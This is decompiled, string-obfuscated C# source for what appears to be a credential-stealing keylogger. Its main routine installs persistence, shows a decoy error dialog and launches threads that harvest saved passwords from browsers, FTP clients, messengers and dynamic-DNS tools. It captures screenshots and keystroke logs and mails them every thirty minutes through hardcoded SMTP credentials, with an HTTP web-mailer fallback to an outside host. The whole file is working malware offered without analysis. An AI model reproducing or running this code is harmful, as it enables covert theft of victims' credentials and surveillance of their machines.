using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class JNXOYT
{
	public static string YKIRG;

	public static string RICXH;

	public static string RYKJL;

	public static string SHVTM;

	public static string EFGYB;

	public static string ISHIE;

	public static string IMXBT;

	public static string CQRTK;

	public static string TFXIC;

	public static string IQEWE;

	public static string TSFEQ;

	public static string LXMYL;

	public static string YTOKH;

	public static string WEEHBIWG = "";

	public static string WTINUEUL = RUDUUFDP.CPMXFIPG("l262vbuXo7zErpKlsLW0Y6W2sauPbKy/ryM=", "False");

	public static string JIGTWDWP = RUDUUFDP.CPMXFIPG("l262vbuXbra9uyM=", "False");

	public static string OCCVYBQX = RUDUUFDP.CPMXFIPG("mq/BxHSOr669slWlvMEj", "False");

	public static int DKMWFUQG = 587;

	public static string CWMRCBXG = RUDUUFDP.CPMXFIPG("DLEXSite", "False");

	public static string WLFHTVHJ = RUDUUFDP.CPMXFIPG("jbS/wn5UbyM=", "False");

	public static string VVKPF = RUDUUFDP.CPMXFIPG("Iw==", "False");

	public static string XHBIP = RUDUUFDP.CPMXFIPG("abG8wLVeX3rJc1Rvg4l0VCM=", "False");

	public static string KQSSF = RUDUUFDP.CPMXFIPG("faq6t7SdtGymqpi3tbaqmWGvwrqSpWzBtJphuMKmimGZpohZc3qXkXJvbCM=", "False");

	public static string CGFYF = RUDUUFDP.CPMXFIPG("aZ+1w6cj", "False");

	public static string QWHHT = RUDUUFDP.CPMXFIPG("dqzC0LQW", "False");

	public static int TKEOD = 1800000;

	public static string HVRMO = "";

	public static string GBHXC = "";

	public static int number = 0;

	public static WXNWOL HTVYHM;

	public static Thread WVTTMS = new Thread(TXCUGH);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread OEIMWV = new Thread(CWYHNJ);

	public static Thread RunThread = new Thread(SDCNFRMTN);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	public static Thread IDMThread = new Thread(DAIDM.IDMdll.GTMYIDM);

	public static Thread CREFTPThread = new Thread(DACore.Coredll.GTMYCore);

	public static Thread NMBZZThread = new Thread(DANMBZZ.NMBZZdll.nimmbuzz);

	public static Thread PGDNThread = new Thread(DAPGDN.PGDNdll.GTMYPig);

	public static Thread SMRTFTPThread = new Thread(DASMRTFTP.Smartdll.GTMYSmart);

	public static Thread DynDNSThread = new Thread(DADynDNS.DynDNSdll.GetDADyn);

	public static Thread ImvuThread = new Thread(DAImvu.Imvudll.GTMYIm);

	public static Thread NoipThread = new Thread(DANoip.Noipdll.GTMYNo);

	[STAThread]
	public static void Main()
	{
		//IL_023f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				HTVYHM = new WXNWOL(GBHXC);
				WXNWOL.USWETQ();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			WVTTMS.IsBackground = true;
			WVTTMS.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			string vVKPF = VVKPF;
			if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("ltLc2gI=", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)0);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("h6zIy7ieshg=", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("c8G3x66bqsjEvJwZ", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("bqqwuC8=", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("W6Ousqcw", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("kdDL4NOpytQJ", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)32);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("cKS8uSI=", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("h9Tg2Nev1NcD", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.CompareString(vVKPF, RUDUUFDP.CPMXFIPG("b6+ywreTosC8tJQh", "False"), false) == 0)
			{
				MessageBox.Show(KQSSF, XHBIP, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show(RUDUUFDP.CPMXFIPG("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), RUDUUFDP.CPMXFIPG("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.IsBackground = true;
			RunThread.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DASafari.SFRIDL sFRIDL = new DASafari.SFRIDL();
			sFRIDL.SAFRGT();
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			new DAOpera.Operaz();
			DAOpera.Operaz.FPQX();
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), overwrite: true);
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), overwrite: true);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), overwrite: true);
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), overwrite: true);
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("g4S2yKmWq7uwvYiuubm6VaauyCM=", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6PKy8yqydDOzpeYwsvFsMbUxNGcws3Nzmm6wtwP", "False"), overwrite: true);
		}
		catch (Exception ex16)
		{
			ProjectData.SetProjectError(ex16, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("k6XN08qguNbAyZzG0c3EnsUR", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("gY20tbaUs7q4uIGCrLWvmrC+rreKtL+7soyzIw==", "False"), overwrite: true);
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), overwrite: true);
		}
		catch (Exception ex18)
		{
			ProjectData.SetProjectError(ex18, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			IDMThread.IsBackground = true;
			IDMThread.Start();
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			CREFTPThread.IsBackground = true;
			CREFTPThread.Start();
		}
		catch (Exception ex20)
		{
			ProjectData.SetProjectError(ex20, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			ImvuThread.IsBackground = true;
			ImvuThread.Start();
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			PGDNThread.IsBackground = true;
			PGDNThread.Start();
		}
		catch (Exception ex22)
		{
			ProjectData.SetProjectError(ex22, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			SMRTFTPThread.IsBackground = true;
			SMRTFTPThread.Start();
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DAMSN.MSNdll.GTMSN();
		}
		catch (Exception ex24)
		{
			ProjectData.SetProjectError(ex24, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DynDNSThread.IsBackground = true;
			DynDNSThread.Start();
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			ImvuThread.IsBackground = true;
			ImvuThread.Start();
		}
		catch (Exception ex26)
		{
			ProjectData.SetProjectError(ex26, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			NoipThread.IsBackground = true;
			NoipThread.Start();
		}
		catch (Exception ex27)
		{
			ProjectData.SetProjectError(ex27, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			OEIMWV.IsBackground = true;
			OEIMWV.Start();
		}
		catch (Exception ex28)
		{
			ProjectData.SetProjectError(ex28, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void VCSHW(ref double ICWOVU)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(ICWOVU);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SDCNFRMTN()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("i57H0bMX", "False")))
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					MailMessage mailMessage = new MailMessage();
					SmtpClient smtpClient = new SmtpClient(OCCVYBQX);
					mailMessage.From = new MailAddress(WTINUEUL);
					mailMessage.To.Add(WTINUEUL);
					mailMessage.Subject = RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString();
					mailMessage.Body = RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + RUDUUFDP.CPMXFIPG("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False");
					smtpClient.Port = DKMWFUQG;
					smtpClient.EnableSsl = true;
					smtpClient.Credentials = new NetworkCredential(WTINUEUL, JIGTWDWP);
					try
					{
						Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
						mailMessage.Attachments.Add(item);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					smtpClient.Send(mailMessage);
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("i57H0bMX", "False"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					try
					{
						string text = RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
						_ = (HttpWebResponse)WebRequest.Create(text + "?to=" + WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + RUDUUFDP.CPMXFIPG("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False"), " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + WTINUEUL).GetResponse();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.Abort();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	public static void TXCUGH()
	{
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(TKEOD);
				text = "";
				string text2 = "";
				double ICWOVU = 0.2;
				VCSHW(ref ICWOVU);
				try
				{
					WebClient webClient = new WebClient();
					text2 = RUDUUFDP.CPMXFIPG("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(RUDUUFDP.CPMXFIPG("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				ICWOVU = 1.0;
				VCSHW(ref ICWOVU);
				try
				{
					if (Operators.CompareString(CGFYF, RUDUUFDP.CPMXFIPG("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + RUDUUFDP.CPMXFIPG("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ICWOVU = 0.3;
				VCSHW(ref ICWOVU);
				try
				{
					if (Operators.CompareString(GBHXC, "", false) != 0)
					{
						HVRMO = RUDUUFDP.CPMXFIPG("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + GBHXC + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(WTINUEUL);
							mailMessage2.To.Add(WTINUEUL);
							mailMessage2.Subject = RUDUUFDP.CPMXFIPG("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = HVRMO;
							try
							{
								if (Operators.CompareString(CGFYF, RUDUUFDP.CPMXFIPG("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + RUDUUFDP.CPMXFIPG("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(OCCVYBQX);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = DKMWFUQG;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(WTINUEUL, JIGTWDWP);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(HVRMO, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + WTINUEUL).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				HVRMO = "";
				GBHXC = "";
				WEEHBIWG = "";
				number++;
			}
		}
	}

	public static void CWYHNJ()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double ICWOVU = 25.0;
			VCSHW(ref ICWOVU);
			string text = RUDUUFDP.CPMXFIPG("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + YKIRG + Environment.NewLine + Environment.NewLine + RICXH + Environment.NewLine + Environment.NewLine + RYKJL + Environment.NewLine + Environment.NewLine + SHVTM + Environment.NewLine + Environment.NewLine + EFGYB + Environment.NewLine + Environment.NewLine + ISHIE + Environment.NewLine + Environment.NewLine + IMXBT + Environment.NewLine + Environment.NewLine + CQRTK + Environment.NewLine + Environment.NewLine + IQEWE + Environment.NewLine + Environment.NewLine + TSFEQ + Environment.NewLine + Environment.NewLine + LXMYL + Environment.NewLine + Environment.NewLine + YTOKH + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(WTINUEUL);
				mailMessage2.To.Add(WTINUEUL);
				mailMessage2.Subject = RUDUUFDP.CPMXFIPG("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(OCCVYBQX);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = DKMWFUQG;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(WTINUEUL, JIGTWDWP);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + WTINUEUL).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
